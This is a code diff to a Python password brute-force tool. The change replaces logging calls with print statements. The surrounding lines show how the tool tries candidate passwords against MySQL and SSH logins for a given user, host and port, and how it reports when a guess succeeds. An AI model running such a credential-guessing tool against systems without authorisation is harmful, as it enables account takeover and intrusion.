@@ -19,14 +19,14 @@ class ConnectionTools:
 
 
     def print_attack(self):
-        logging.info("===================================================")
-        logging.debug("===================================================")
-        logging.info("Launching a brute force attack on")
-        logging.info("User: " + str(self.user))
-        logging.info("Host: " + str(self.host))
-        logging.info("port: " + str(self.port))
-        logging.info("protocol: " +str(self.protocol))
-        logging.info("===================================================")
+        print("===================================================")
+        print("===================================================")
+        print("Launching a brute force attack on")
+        print("User: " + str(self.user))
+        print("Host: " + str(self.host))
+        print("port: " + str(self.port))
+        print("protocol: " +str(self.protocol))
+        print("===================================================")
 
     def reset_index(self):
         self.index = 0
@@ -38,13 +38,13 @@ class ConnectionTools:
         self.port = port
 
     def mysql_connection(self, password, queue, index, found_password):
-        logging.info('Testing password: ' + password + "\t\t #" + str(index.value))
+        print('Testing password: ' + password + "\t\t #" + str(index.value))
         index.value += 1
         try:
             cnx = mysql.connector.connect(user=self.user, password=password,\
                     host=self.host, port=self.port)
             self.good_password = str(password)
-            logging.info("we found the password " + str(password))
+            print("we found the password " + str(password))
             queue.put(password)
             found_password.value=password
             return True
@@ -54,12 +54,12 @@ class ConnectionTools:
 
 
     def ssh_connection(self, password, queue, index, found_password):
-        logging.info('Testing password: ' + password + "\t\t #" + str(index.value))
+        print('Testing password: ' + password + "\t\t #" + str(index.value))
         index.value += 1
         try :
             self.connection.connect(self.host, username=self.user, password=password)
             self.good_password = str(password)
-            logging.info("we found the password " + str(password))
+            print("we found the password " + str(password))
             queue.put(password)
             found_password.value=password
             return True
@@ -132,10 +132,10 @@ class ConnectionTools:
 
             #if the password has been found
             if queue.qsize()>=1:
-                logging.info("Oh yeah baby, we found it! The password is " + str(found_password.value))
+                print("Oh yeah baby, we found it! The password is " + str(found_password.value))
                 break 
 
             if len(self.password_list)==0:
-                logging.info("Sorry, the password could not be found!")
+                print("Sorry, the password could not be found!")
 
-        logging.info("We are done here!")    
+        print("We are done here!")    
